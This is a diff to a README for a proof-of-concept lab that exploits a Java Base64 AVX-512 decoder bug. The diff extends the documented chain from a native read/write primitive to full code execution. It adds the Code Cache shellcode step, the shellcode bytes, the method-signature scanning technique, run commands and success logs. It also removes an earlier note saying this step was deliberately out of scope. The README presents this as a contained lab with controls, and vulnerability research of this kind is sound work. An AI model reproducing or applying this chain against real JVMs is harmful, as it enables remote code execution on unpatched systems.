@@ -26,9 +26,33 @@ Java's fast Base64 decoder is told to write 0 bytes, an underflow turns that
 into `-1`, the CPU treats `-1` as "write all 64 bytes", and 62 bytes spill past
 the output buffer before Java throws an error.
 
+## The complete chain
+
+```text
+malformed Base64 tail  (64 * "A" + "=")
+   |
+   v  fixed 62-byte AVX-512 masked store
+corrupted array length  ->  "writer"
+   |
+   +--> chosen-value linear write
+   |       |
+   |       +--> read neighbours        ->  heap disclosure ("reader"/JavaBleed)
+   |       |
+   |       +--> corrupt a DirectByteBuffer.address
+   |                |
+   |                v  64-bit native read/write
+   |            scan Code Cache for a JIT-compiled method
+   |                |
+   |                v  overwrite its code with shellcode
+   |            J4S-RCE-PWN  (exit 42)
+```
+
+Every arrow is implemented and verified in this repository. No `sun.misc.Unsafe`,
+no JNI, no native library loading, and no second memory-safety bug.
+
 ## Status
 
-Tested end-to-end on **2026-11-22** with:
+Tested end-to-end on **2026-11-23** with:
 
 - **Eclipse Temurin 21.0.13+9** (pre-fix; fixed in 21.0.13.1)
 - **Intel SDE 10.13.1** (`sde64 -chip_check_disable -icx -- java ...`)
@@ -43,10 +67,12 @@ reproduced; `control` did not reproduce (which is the expected result).
 The `chain` stage reached every heap primitive and completed three forced GCs
 after header repair. The `native` stage then obtained a **64-bit native
 read/write** by corrupting a `DirectByteBuffer.address` — no Unsafe, no JNI, no
-second bug. Overwriting a Code Cache `nmethod` from there is the remaining step
-and is not implemented. The `rce` stage reaches command execution through a
-purpose-built application sink, which is a separate path. Negative controls
-(`chain-control`, `rce-control`) failed to reproduce, as intended.
+second bug. The `codecache` stage used that primitive to locate a JIT-compiled
+method in the Code Cache and overwrite it with shellcode: **full code
+execution**, proven by the marker the shellcode prints and exit status 42.
+The `rce` stage reaches command execution through a purpose-built application
+sink, which is a separate path. All negative controls (`control`,
+`chain-control`, `codecache-control`, `rce-control`) failed to reproduce.
 
 On a real AVX-512 host, use `LAB_MODE=native` to skip SDE.
 
@@ -129,6 +155,7 @@ Run individual stages:
 ./run.sh chain         # writer -> reader -> forged header -> repair + GC
 ./run.sh chain-control # same chain with the intrinsic disabled
 ./run.sh native        # 64-bit native read/write via corrupted buffer
+./run.sh codecache     # full RCE: shellcode runs, process exits 42
 ./run.sh rce           # command execution via a local application sink
 ./run.sh rce-control   # same RCE attempt with the intrinsic disabled
 ```
@@ -348,10 +375,8 @@ address space. In this image, `/proc/self/maps` shows 45 executable mappings,
 A 64-bit native read/write is therefore one rewritten function pointer away from
 code execution — no `sun.misc.Unsafe`, no JNI, and no second memory-safety bug.
 
-That last step (locate an `nmethod`/JVM hook, overwrite it, trigger it) is
-**not implemented here**. It is mechanical rather than blocked: it needs
-HotSpot-internals work against a specific build, and it is deliberately out of
-scope for this lab. So the honest status is:
+The next stage implements the final step: `CodeCacheRce` finds the compiled
+method and executes shellcode from it. The full status is:
 
 | Step | Status |
 |---|---|
@@ -360,7 +385,58 @@ scope for this lab. So the honest status is:
 | Chosen-value linear write | ✅ verified |
 | Header repair + GC survival | ✅ verified |
 | **64-bit native read/write** | ✅ verified (`native` stage) |
-| **Code Cache overwrite → shellcode** | ❌ not implemented (mechanical next step) |
+| **Code Cache overwrite → shellcode** | ✅ verified (`codecache` stage) |
+
+### `codecache` — shellcode execution (weaponized RCE)
+
+`CodeCacheRce` completes the chain. It uses the native read/write from the
+`native` stage and adds three steps:
+
+```text
+[2] direct.address @ writer[312], scan.address @ writer[696]
+[2] NATIVE READ/WRITE READY
+[3] maps lines=363 exec=45 usable=44
+[3] scanning 44 readable executable mappings
+[3] scanned 1093748 KiB, 0 unreadable chunk(s)
+[3] 2 signature site(s): 0x7f1b08b3d59a, 0x7f1b29889b31
+[3] shellcode 48 bytes: b8 01 00 00 00 bf 01 00 00 00 48 8d 35 13 ...
+[4] shellcode installed at 2 site(s)
+[5] invoking victimMethod() ...
+[5] expect marker below and exit status 42
+J4S-RCE-PWN
+```
+
+and the process exits **42**.
+
+How the last steps work:
+
+1. **Find the code.** A leaf method `victimMethod()` returns a unique 64-bit
+   constant. C2 compiles it to `movabs rax, <constant>`; the program scans
+   readable executable mappings for that exact instruction (`48 b8` + the
+   constant) to locate the method's entry point. Scanning is bounded to
+   `/proc/self/maps` regions and skips the `vsyscall` page.
+2. **Overwrite it.** The corrupted `DirectByteBuffer` address gives a 64-bit
+   write; the signature site is replaced with 48 bytes of shellcode.
+3. **Run it.** Reflecting `victimMethod()` enters the overwritten code.
+
+The shellcode is x86-64 Linux: `write(1, "J4S-RCE-PWN\n", 12)` followed by
+`exit_group(42)`. It never returns, so the hijacked method needs no valid stack
+frame. Both the marker (proving *our* code ran) and exit status 42 (chosen by
+us) are proof of control — not a crash.
+
+```bash
+./run.sh codecache           # expected: marker + exit 42 (~3 min)
+./run.sh codecache-control   # intrinsic disabled: NOT VULNERABLE, exit 0
+```
+
+`codecache-control` disables the intrinsic, so `writer.length` stays 64 and the
+program stops at step 1 without touching the Code Cache.
+
+**Caveats.** This is real code execution inside the disposable container, not a
+product exploit. The signature search assumes x86-64 and a specific JIT
+encoding; a different build may need a different signature. It also requires the
+process to have writable+executable Code Cache, which is the case here (20 of 45
+executable mappings are `rwxp`).
 
 ### `rce` — command execution via an application sink
 
@@ -495,6 +571,7 @@ Code Cache.
 | `poc/HeapWrite.java` | The same corrupted length turns ordinary Java stores into a chosen-value OOB write into a neighbouring array. |
 | `poc/Chain.java` | Writer → reader → forged header → repair. Establishes chosen-value linear write, heap disclosure, aliased object access, and GC survival. Heap-only by construction. |
 | `poc/NativeProbe.java` | Corrupts a `DirectByteBuffer.address` and demonstrates 64-bit native read/write with no Unsafe/JNI. Finds the field by oracle rather than a hardcoded offset. |
+| `poc/CodeCacheRce.java` | Scans the Code Cache for a compiled method's signature, overwrites it with shellcode, and invokes it. Prints `J4S-RCE-PWN` and exits 42. |
 | `poc/RceLab.java` | Deliberately vulnerable HTTP target: decode sink, corrupted session blob, and a maintenance hook that executes a recovered config string. |
 | `poc/RceClient.java` | Attacker client: fires the trigger, scans the heap through the corrupted length, and asks the target to execute the recovered command. |
 
@@ -505,12 +582,16 @@ disposable container.
 
 ## Scope and limitations
 
-- **The chain reaches native memory but not code execution.** `Chain.java` is
-  heap-only by construction. `NativeProbe.java` goes further: corrupting a
-  `DirectByteBuffer.address` yields a 64-bit native read/write with no Unsafe,
-  JNI, or second bug. Overwriting a Code Cache `nmethod`/JVM hook from there is
-  the remaining step; it is mechanical but HotSpot-build-specific, and is not
-  implemented in this lab.
+- **The chain reaches code execution.** `Chain.java` is heap-only by
+  construction. `NativeProbe.java` corrupts a `DirectByteBuffer.address` for a
+  64-bit native read/write with no Unsafe, JNI, or second bug.
+  `CodeCacheRce.java` then scans executable mappings for the compiled victim
+  method's signature, overwrites it with shellcode, and invokes it. The
+  shellcode writes `J4S-RCE-PWN` and exits with status 42.
+- **The Code Cache step is build-specific.** It relies on x86-64 instruction
+  encoding and finding a unique `movabs` constant; other JVMs, architectures or
+  inlining decisions need their own signature. That is an engineering
+  difference, not a missing primitive.
 - **Command execution uses an application sink.** The `rce` stage reaches
   `ProcessBuilder` because `RceLab` contains a maintenance hook that runs a
   config string from the session blob. The exploit moves attacker bytes into
@@ -601,6 +682,7 @@ poc/HeapLeak.java       JavaBleed-style heap disclosure
 poc/HeapWrite.java      chosen-value OOB write
 poc/Chain.java          writer -> reader -> forge -> repair (second half)
 poc/NativeProbe.java    corrupted buffer address -> native read/write
+poc/CodeCacheRce.java   Code Cache overwrite -> shellcode execution
 poc/RceLab.java         vulnerable HTTP target for the RCE stage
 poc/RceClient.java      attacker client for the RCE stage
 compose.yaml            optional Compose configuration
